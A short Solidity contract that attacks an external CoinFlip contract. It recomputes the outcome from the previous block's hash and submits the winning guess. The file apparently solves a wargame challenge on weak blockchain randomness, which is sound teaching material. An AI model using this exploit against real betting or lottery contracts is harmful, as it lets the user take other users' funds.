pragma solidity ^0.4.18;

interface CoinFlip {
    function flip(bool) external returns (bool);
}

contract DeterministicCoinFlip {
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function dFlip(address flipAddress) public {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    CoinFlip(flipAddress).flip(side);
  }
}